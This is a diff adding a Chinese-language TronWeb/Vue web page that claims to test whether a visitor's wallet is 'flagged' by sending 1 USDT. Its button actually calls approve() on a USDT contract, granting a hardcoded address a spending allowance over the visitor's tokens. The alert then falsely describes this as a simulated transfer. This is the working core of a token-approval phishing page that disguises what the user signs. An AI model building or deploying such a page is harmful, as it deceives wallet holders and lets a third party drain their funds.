@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>测试授权页面</title>
+  <script src="https://cdn.jsdelivr.net/npm/vue@3.2.47/dist/vue.global.prod.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; background: #f7f7f7; }
+    h1 { font-size: 1.5rem; text-align: center; }
+    button { width: 100%; padding: 15px; font-size: 1rem; margin-top: 20px; border: none; border-radius: 8px; background: #2196F3; color: white; }
+    .container { max-width: 500px; margin: auto; }
+  </style>
+</head>
+<body>
+  <div id="app" class="container">
+    <h1>转账1USDT测试是否被标记</h1>
+    <button @click="authorizeTransfer">测试授权（转账1USDT）</button>
+  </div>
+
+  <script>
+    const { createApp } = Vue;
+    const receiverAddress = "TQfrsE1L52PCKq9YWyU3cvFF19xu5EPPsP";
+    const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT 合约地址
+
+    createApp({
+      methods: {
+        async authorizeTransfer() {
+          if (!window.tronWeb || !window.tronWeb.ready) {
+            return alert("钱包未连接");
+          }
+          const tronWeb = window.tronWeb;
+          try {
+            const contract = await tronWeb.contract().at(usdtContract);
+            await contract.approve(receiverAddress, tronWeb.toSun(1)).send(); // 改为授权1 USDT
+            alert("授权成功，已模拟转账1USDT用于标记");
+          } catch (err) {
+            console.error(err);
+            alert("授权失败，请重试");
+          }
+        }
+      }
+    }).mount('#app');
+  </script>
+</body>
+</html>
